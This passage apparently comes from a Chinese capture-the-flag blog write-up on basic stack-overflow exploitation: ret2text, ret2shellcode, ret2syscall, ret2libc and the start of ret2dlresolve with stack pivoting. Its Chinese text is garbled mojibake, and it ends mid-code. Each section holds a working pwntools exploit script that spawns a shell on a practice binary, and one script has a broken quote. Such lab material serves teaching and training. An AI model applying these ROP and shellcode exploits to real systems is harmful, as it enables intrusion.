alt="image.png"></p><p>æ¥ä¸‹æ¥å°±æ˜¯è®¡ç®—sçš„åç§»é‡ã€‚è®¾ç½®æ–­ç‚¹0x08048641ï¼Œè¿›è¡Œè°ƒè¯•</p><p>å¯ä»¥çœ‹åˆ°ï¼ŒespæŒ‡å‘åœ°å€ä¸º0xffffcf70ï¼ŒebpæŒ‡å‘åœ°å€ä¸º0xffffcff8ï¼Œå› ä¸ºsçš„åœ°å€ä¸ºesp+0x1cï¼Œæ‰€ä»¥sç›¸å½“äºebpçš„åç§»é‡ä¸ºï¼š0xffffcff8-0xffffcf70-0x1c=0x6cï¼Œsç›¸å½“äºè¿”å›åœ°å€çš„åç§»é‡ä¸ºï¼š 0x6c+4<img src="https://i.loli.net/2021/06/06/KFQVS5bCJfePYTs.png" alt="image.png"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;a&#x27;</span> * (<span class="number">0x6c</span>+<span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ ˆæº¢å‡ºç›´æ¥è·³è½¬åˆ°å¯¹åº”çš„åé—¨å‡½æ•°ï¼Œä»è€Œè·å–shellï¼Œå †æ ˆå›¾å¦‚ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/10/16/Iun5QrlVOhaJwRK.png" alt="image.png"></p><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></h1><h2 id="æ–¹æ³•-1"><a href="#æ–¹æ³•-1" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><p>ç¨‹åºæ‰§è¡Œæˆ‘ä»¬è‡ªå·±å¡«å……çš„shellcodeä»£ç </p><h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>æŒ‰ç…§ret2textæ€è·¯ï¼Œå‘ç°å­˜åœ¨æ ˆæº¢å‡ºï¼Œè®¡ç®—å‡ºsç›¸å¯¹äºè¿”å›åœ°å€çš„åç§»é‡ä¸º112ã€‚æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œå¹¶æ²¡æœ‰å‘ç°systemå‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¼šå¤åˆ¶åˆ°buf2ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨buf2æ„é€ shellcodeä»£ç ï¼Œ<img src="https://i.loli.net/2021/06/06/QbU3YlyvFrws2V8.png" alt="image.png"><img src="https://i.loli.net/2021/06/06/3lnkurmIjBxszJG.png" alt="image.png"></p><p>å…ˆåˆ¤æ–­ä¸€ä¸‹buf2æ‰€åœ¨åœ°å€æ˜¯å¦å¯æ‰§è¡Œã€‚åˆ©ç”¨IDAæŸ¥çœ‹buf2çš„åœ°å€<img src="https://i.loli.net/2021/06/06/aVwCQ9mclOuWKdY.png" alt="image.png"></p><p>åœ¨æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªåœ°å€æ˜¯å¦å¯æ‰§è¡Œã€‚å‘ç°è¿™ä¸ªåœ°å€å¯è¯»å¯å†™å¯æ‰§è¡Œã€‚<img src="https://i.loli.net/2021/06/06/xFsyLRJPEoZ4YfS.png" alt="image.png"></p><p>ä¹‹åæ„å»ºpayload</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">buf2 = <span class="number">0x804A080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;a&#x27;</span>) + p32(buf2)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="string">&quot;&quot;&quot;è§£é‡Šä¸€ä¸‹&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;shellcraft.shä½œç”¨æ˜¯ç”Ÿæˆå¥½system(&quot;bin/sh&quot;)çš„ä»£ç &quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;asmå‡½æ•°æ˜¯å°†ä»£ç è½¬æˆæœºå™¨æŒ‡ä»¤&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;ljustå‡½æ•°ä½œç”¨å°±æ˜¯å‘å³å¯¹å…¶å¹¶ç”¨ç»™å®šå­—ç¬¦è¡¥å……å­—ç¬¦ä¸²&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡æ ˆæº¢å‡ºè·³è½¬åˆ°æˆ‘ä»¬å†™å¥½shellcodeçš„åŒºåŸŸï¼Œè®©ç¨‹åºæ‰§è¡Œshellcodeä»è€Œè·å–shell</p><p><img src="https://i.loli.net/2021/10/16/gKpoSxOZ6EDCtrN.png" alt="image.png"></p><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2syscall</a></h1><h2 id="æ–¹æ³•-2"><a href="#æ–¹æ³•-2" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><p>æ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè·å– shellã€‚</p><h2 id="æ€è·¯-2"><a href="#æ€è·¯-2" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>å…ˆæŸ¥çœ‹é™„ä»¶</p><p><img src="https://i.loli.net/2021/06/06/E548xu9R7JOXjph.png" alt="image.png"></p><p>æ¥ä¸‹æ¥åˆ©ç”¨ IDA æ¥æŸ¥çœ‹æºç ï¼Œå¹¶æ²¡æœ‰systemå‡½æ•°ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰bin/shå­—ç¬¦<img src="https://i.loli.net/2021/06/06/Ih4PmFtxo63OgBn.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºï¼Œæ¥ä¸‹æ¥å°±æ˜¯è®¡ç®—v4çš„åç§»é‡ã€‚å…ˆè®¾ç½®æ–­ç‚¹ï¼Œå°†æ–­ç‚¹è®¾ç½®åœ¨è°ƒç”¨getså‡½æ•°é‚£é‡Œ<img src="https://i.loli.net/2021/06/06/mgMuoesVOpEzWXQ.png" alt="image.png"></p><p>æ¥ä¸‹æ¥å°±æ˜¯è°ƒè¯•ã€‚å¯ä»¥çœ‹åˆ°espæŒ‡å‘åœ°å€0xffffcf80ï¼Œv4çš„åœ°å€ä¸ºesp+1cï¼ŒebpæŒ‡å‘çš„åœ°å€0xffffd008ï¼Œç”±æ­¤å¯ä»¥è®¡ç®—å‡ºv4çš„åç§»é‡ä¸º0xffffd008-0xffffcf80-0x1c=108ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¦†ç›–çš„è¿”å›åœ°å€ç›¸å¯¹äº v4 çš„åç§»ä¸º 112ã€‚<img src="https://i.loli.net/2021/06/06/qzpYFsk2cQNmg14.png" alt="image.png"></p><p>æ­¤æ¬¡ï¼Œç”±äºæˆ‘ä»¬ä¸èƒ½ç›´æ¥åˆ©ç”¨ç¨‹åºä¸­çš„æŸä¸€æ®µä»£ç æˆ–è€…è‡ªå·±å¡«å†™ä»£ç æ¥è·å¾— shellï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ç¨‹åºä¸­çš„ gadgets æ¥è·å¾— shellï¼Œè€Œå¯¹åº”çš„ shell è·å–åˆ™æ˜¯åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨ã€‚ï¼ˆ<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">ç³»ç»Ÿè°ƒç”¨åŸºæœ¬çŸ¥è¯†</a>ï¼‰æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰§è¡Œ int 0x80 æ¥æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ã€‚å¯¹äºè¿™é“é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç³»ç»Ÿè°ƒç”¨**execve(â€œ/bin/shâ€,NULL,NULL)**ï¼Œå…¶ä¸­ï¼Œè¯¥ç¨‹åºæ˜¯ 32 ä½ï¼Œè¿™ä¸ªç³»ç»Ÿè°ƒç”¨éœ€è¦æ»¡è¶³çš„æ¡ä»¶ï¼š</p><ul><li>ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³ eax åº”è¯¥ä¸º 0xbï¼ˆæ˜¯æŒ‡ç³»ç»Ÿè°ƒç”¨ç¼–å·ï¼‰</li><li>ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ ebx åº”è¯¥æŒ‡å‘ /bin/sh çš„åœ°å€ï¼Œå…¶å®æ‰§è¡Œ sh çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚</li><li>ç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ ecx åº”è¯¥ä¸º 0</li><li>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³ edx åº”è¯¥ä¸º 0</li></ul><p>ä¸ºæ»¡è¶³è¿™äº›æ¡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ gadgetsæ¥å®Œæˆã€‚å¦‚åˆ©ç”¨å †æ ˆå¯¹å¯„å­˜å™¨èµ‹å€¼ï¼Œå…ˆå°†10å­˜å…¥æ ˆä¸­ï¼Œå†pop eaxã€‚æ‰€ä»¥ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾ç¬¦åˆæ¡ä»¶çš„gadgetsã€‚ï¼ˆ<a href="https://www.wangan.com/docs/678">ROPgadgetå®‰è£…ä¸ä½¿ç”¨æ–¹æ³•</a>ï¼‰<img src="https://i.loli.net/2021/06/06/lExnp75bSDTwsyi.png" alt="image.png"></p><p>æ¥ä¸‹æ¥å°±æ˜¯ç»„è£…ï¼š**payload = flat([â€˜Aâ€™ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_0x80])**ï¼Œå…¶ä¸­ 0xb ä¸º execve å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">bin_sh = <span class="number">0x80be408</span></span><br><span class="line">payload =<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>+p32(pop_eax_ret)+ p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(int_0x80)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/3Jz9KSrEgZDPcYW.png" alt="image.png"></p><h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></h1><h2 id="æ–¹æ³•-3"><a href="#æ–¹æ³•-3" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><p>åˆ©ç”¨gadgetsæ„å»ºROPè·å–shell</p><h2 id="æ€è·¯-3"><a href="#æ€è·¯-3" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>checkä¸€ä¸‹32ä½ç¨‹åºï¼Œä¸”åªå¼€äº†NXä¿æŠ¤</p><p><img src="https://i.loli.net/2021/07/12/T7UivSYopaZFkxK.png" alt="image.png"></p><p>ä¸¢è¿›IDAï¼ŒæŸ¥çœ‹ä¼ªä»£ç ï¼Œå­˜åœ¨getså‡½æ•°ï¼Œå¾ˆæ˜æ˜¾å­˜åœ¨æ ˆæº¢å‡º<img src="https://i.loli.net/2021/07/12/Z6y1jb4Rx7zoien.png" alt="image.png"></p><p>æŸ¥çœ‹å‡½æ•°åˆ—è¡¨ä»¥åŠå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œå¾ˆæ˜æ˜¾å¯ä»¥æ„å»ºROP<img src="https://i.loli.net/2021/07/12/R49gkfUZyHouv3e.png" alt="å±å¹•æˆªå›¾ 2021-07-12 101906.png"></p><p>æœ€åå°±æ˜¯è®¡ç®—åç§»é‡ã€‚sçš„åç§»é‡0xffffcfb8-ffffcf4c=6cï¼Œç›¸å¯¹äºè¿”å›åœ°å€çš„åç§»é‡6c+4<img src="https://i.loli.net/2021/07/12/j4w8hMAQ1ntcyfp.png" alt="image.png"></p><h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line">sys_addr = <span class="number">0x8048460</span></span><br><span class="line">bin_sh = <span class="number">0x08048720</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(sys_addr)+â€˜a<span class="string">&#x27;*4+p32(bin_sh)</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;å› ä¸ºè°ƒç”¨systemå‡½æ•°ä¸­é€”éœ€è¦ä¸€ä¸ªè¿”å›åœ°å€ï¼Œè€Œç›´æ¥åˆ©ç”¨system gadgetä¼šå¯¼è‡´ç¼ºå¤±è¿”å›åœ°å€ï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªè™šæ‹Ÿåœ°å€p32(0x11111111)å¹³è¡¡å †æ ˆ&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/K6agdE8mjHhtR1M.png" alt="image.png"></p><h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></h1><p>idaæŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰systemå‡½æ•°ï¼Œä½†æ˜¯æ²¡æœ‰bin/shï¼Œä½†æ˜¯è¿™é‡Œæœ‰getså‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨getså‡½æ•°ä¼ å…¥bin/shå­—ç¬¦ï¼Œä»è€Œåˆ©ç”¨systemè·å–shell</p><p><img src="https://i.loli.net/2021/08/30/lJf9ZiPbnCsWDQq.png" alt="å±å¹•æˆªå›¾ 2021-08-30 093824.png"></p><p><img src="https://i.loli.net/2021/08/30/n2o6rlDEY1vsKhH.png" alt="image.png"></p><p>è®¡ç®—å¥½åç§»ï¼Œå°†é€šè¿‡getsè·å–çš„å­—ç¬¦å­˜å…¥åˆ°bssæ®µå¯å†™åŒºåŸŸ</p><p><img src="https://i.loli.net/2021/08/30/XRCi8KrmfosnlcY.png" alt="å±å¹•æˆªå›¾ 2021-08-30 105444.png"></p><h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">sys_addr = <span class="number">0x08048490</span></span><br><span class="line">bss = <span class="number">0x804a000</span></span><br><span class="line">gets_addr = <span class="number">0x8048460</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>+p32(gets_addr)+p32(sys_addr)+p32(bss)+p32(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>æ ˆç¤ºæ„å›¾å¦‚ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/10/15/1oSdCuYms2y97iI.png" alt="image.png"></p><h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><h2 id="æ€è·¯-4"><a href="#æ€è·¯-4" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>è¿™æ¬¡çš„é¢˜ç›®æ²¡æœ‰systemå‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰bin/shå­—ç¬¦ä¸²ï¼Œä¹Ÿä¸åƒret2shellcodeå¯ä»¥è·³è½¬æ‰§è¡Œshellcodeï¼Œå› æ­¤ï¼Œåªèƒ½æ¢è¿‡ä¸€ç§æ€è·¯ã€‚åœ¨libc.so åŠ¨æ€é“¾æ¥åº“ä¸­å‡½æ•°çš„åç§»æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³„éœ²æŸä¸ªå‡½æ•°çš„åç§»æ¥ç¡®å®šç¨‹åºä½¿ç”¨çš„libcç‰ˆæœ¬ï¼Œä»è€Œè·å–systemå‡½æ•°çš„çš„åœ°å€ã€‚æˆ‘ä»¬ä¸€èˆ¬å¸¸ç”¨çš„æ–¹æ³•æ˜¯é‡‡ç”¨ got è¡¨æ³„éœ²ï¼Œå³è¾“å‡ºæŸä¸ªå‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹ã€‚<strong>å½“ç„¶ï¼Œç”±äº libc çš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œæˆ‘ä»¬éœ€è¦æ³„æ¼å·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°çš„åœ°å€ã€‚</strong>ï¼ˆæ‰€è°“å»¶è¿Ÿç»‘å®šï¼Œå°±æ˜¯å½“å‡½æ•°ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨çš„æ—¶å€™æ‰è¿›è¡Œç»‘å®šï¼ˆåŒ…æ‹¬ç¬¦å·æŸ¥æ‰¾ã€é‡å®šä½ç­‰ï¼‰ï¼Œå¦‚æœå‡½æ•°ä»æ¥æ²¡æœ‰ç”¨åˆ°è¿‡å°±ä¸è¿›è¡Œç»‘å®šã€‚åŸºäºå»¶è¿Ÿç»‘å®šå¯ä»¥å¤§å¤§åŠ å¿«ç¨‹åºçš„å¯åŠ¨é€Ÿåº¦ï¼Œç‰¹åˆ«æœ‰åˆ©äºä¸€äº›å¼•ç”¨äº†å¤§é‡å‡½æ•°çš„ç¨‹åºï¼‰å…·ä½“æ“ä½œå¦‚ä¸‹ï¼š</p><ul><li><p>æ³„éœ² __libc_start_main åœ°å€</p></li><li><p>è·å– libc ç‰ˆæœ¬</p></li><li><p>è·å– system åœ°å€ä¸ /bin/sh çš„åœ°å€</p></li><li><p>å†æ¬¡æ‰§è¡Œæºç¨‹åº</p></li><li><p>è§¦å‘æ ˆæº¢å‡ºæ‰§è¡Œ system(â€˜/bin/shâ€™)</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p><img src="https://i.loli.net/2021/10/16/zTAHIWrEq6UB3Lf.png" alt="å±å¹•æˆªå›¾ 2021-10-16 145422.png"></p><h2 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]        <span class="comment"># è·å–ç¨‹åºä¸­putså‡½æ•°çš„pltåœ°å€</span></span><br><span class="line">libc_puts_got = ret2libc3.got[<span class="string">&#x27;puts&#x27;</span>]          <span class="comment"># è·å–ç¨‹åºä¸­putså‡½æ•°çš„got</span></span><br><span class="line">start_addr = ret2libc3.symbols[<span class="string">&#x27;_start&#x27;</span>]        <span class="comment"># è·å–ç¨‹åºä¸­_startå‡½æ•°çš„åœ°å€</span></span><br><span class="line">payload1 = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt,start_addr , libc_puts_got])        <span class="comment"># é€šè¿‡æ ˆæº¢å‡ºè®©ç¨‹åºè·³è½¬åˆ°putså‡½æ•°æ³„éœ²å‡ºlibc_puts_gotåœ°å€å†è¿”å›åˆ°startå‡½æ•°é‡æ–°æ‰§è¡Œ</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>, payload1)</span><br><span class="line">libc_puts_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])         <span class="comment"># æ¥æ”¶putså‡½æ•°çš„åœ°å€</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, libc_puts_addr)       <span class="comment"># ç¡®å®šç¨‹åºä½¿ç”¨çš„libc</span></span><br><span class="line">libcbase = libc_puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)       <span class="comment"># è®¡ç®—åŸºåœ°å€</span></span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)         <span class="comment"># è®¡ç®—å‡ºsystemå‡½æ•°ä»¥åŠbin/shå­—ç¬¦ä¸²çš„åœ°å€</span></span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2 = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, system_addr, <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://i.loli.net/2021/10/16/ZDnvcXt1YoPOlSV.png" alt="image.png"></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/#ret2syscall">https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/#ret2syscall</a></p><h1 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h1><p>ä»‹ç»è¿™é“é¢˜å‰å…ˆè¡¥å……ä¸€äº›çŸ¥è¯†ç‚¹ï¼š</p><h2 id="dl-runtime-resolve-å‡½æ•°"><a href="#dl-runtime-resolve-å‡½æ•°" class="headerlink" title="dl_runtime_resolve å‡½æ•°"></a>dl_runtime_resolve å‡½æ•°</h2><p>åœ¨å»¶è¿Ÿç»‘å®šä¸­è¯´åˆ°dl_runtime_resolve å‡½æ•°ï¼Œåªæ˜¯è¯´äº†è¿™ä¸ªå‡½æ•°ä¼šå¯»æ‰¾ç¨‹åºç¬¬ä¸€æ¬¡æ‰§è¡Œçš„å‡½æ•°ä½†æ˜¯å¹¶æ²¡æœ‰è¯´åŸç†ï¼Œè¿™æ¬¡æ¥è¡¥å……ä¸€ä¸‹ã€‚</p><ol><li><p>dl_runtime_resolve éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯ reloc_argï¼Œå°±æ˜¯å‡½æ•°è‡ªå·±çš„ plt è¡¨é¡¹ push çš„å†…å®¹ï¼Œä¸€ä¸ªæ˜¯link_mapï¼Œè¿™ä¸ªæ˜¯å…¬å…± plt è¡¨é¡¹ push è¿›æ ˆçš„ï¼Œé€šè¿‡å®ƒå¯ä»¥æ‰¾åˆ°.dynamicçš„åœ°å€</p></li><li><p>è€Œ .dynamic å¯ä»¥æ‰¾åˆ° .dynstrã€.dynsymã€.rel.plt çš„è¿™äº›ä¸œè¥¿çš„åœ°å€</p></li><li><p>.rel.plt çš„åœ°å€åŠ ä¸Š reloc_arg å¯ä»¥å¾—åˆ°å‡½æ•°é‡å®šä½è¡¨é¡¹ Elf32_Rel çš„æŒ‡é’ˆï¼Œè¿™ä¸ªæŒ‡é’ˆå¯¹åº”çš„é‡Œé¢æ”¾ç€ r_offsetã€r_info</p></li><li><p>å°† r_info&gt;&gt;8 å¾—åˆ°çš„å°±æ˜¯ .dynsym çš„ä¸‹æ ‡ï¼Œè¿™ä¸ªä¸‹æ ‡çš„å†…å®¹å°±æ˜¯ name_offset</p></li><li><p>.dynstr+name_offset å¾—åˆ°çš„å°±æ˜¯ st_nameï¼Œè€Œ st_name å­˜æ”¾çš„å°±æ˜¯è¦è°ƒç”¨å‡½æ•°çš„å‡½æ•°å</p></li><li><p>åœ¨åŠ¨æ€é“¾æ¥åº“é‡Œé¢æ‰¾è¿™ä¸ªå‡½æ•°çš„åœ°å€ï¼Œèµ‹å€¼ç»™ *rel-&gt;r_offsetï¼Œä¹Ÿå°±æ˜¯ GOT è¡¨å°±å®Œæˆäº†ä¸€æ¬¡å‡½æ•°çš„åŠ¨æ€é“¾æ¥</p></li></ol><p><img src="https://i.loli.net/2021/10/19/zjxKC16SvowlBnE.png" alt="image.png"></p><h2 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h2><p>æ ˆè¿ç§»ä½œç”¨æ˜¯è®©ç¨‹åºè·³è½¬åˆ°æˆ‘ä»¬æ„é€ å¥½çš„æ ˆä¸­ä»è€Œè®©ç¨‹åºæŒ‰ç…§æˆ‘ä»¬çš„æ€è·¯èµ°ä¸‹å»ã€‚</p><ul><li>å…ˆç”¨æ— ç”¨å­—ç¬¦å¡«æ»¡åˆ°rbp</li><li>åœ¨å°†rbpè·³è½¬åˆ°æˆ‘ä»¬æƒ³æ„é€ çš„æ ˆå¸§ä½ç½®</li><li>å†é€šè¿‡readå‘æˆ‘ä»¬æƒ³æ„é€ çš„æ ˆä¸­å†™å…¥æ•°æ®</li><li>æœ€åé€šè¿‡leave_retå°†espæŒ‡å‘æ ˆå¸§ï¼ŒebpæŒ‡å‘æ ˆåº•ä½ç½®</li></ul><p><img src="https://i.loli.net/2021/10/20/yHcJdKsqGZ5zCeP.png" alt="image.png"></p><p>å› ä¸ºæ­¥éª¤æœ‰ç‚¹å¤šï¼Œæ‰€ä»¥å°±è¾¹å†™è¾¹æ”¹ã€‚</p><h2 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h2><p>å…ˆå°†æ ˆè¿ç§»åˆ°æˆ‘ä»¬æƒ³æ„é€ çš„åœ°æ–¹å¹¶åœ¨è¯¥åœ°æ–¹å†™å…¥æˆ‘ä»¬æƒ³è¦å†™çš„æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 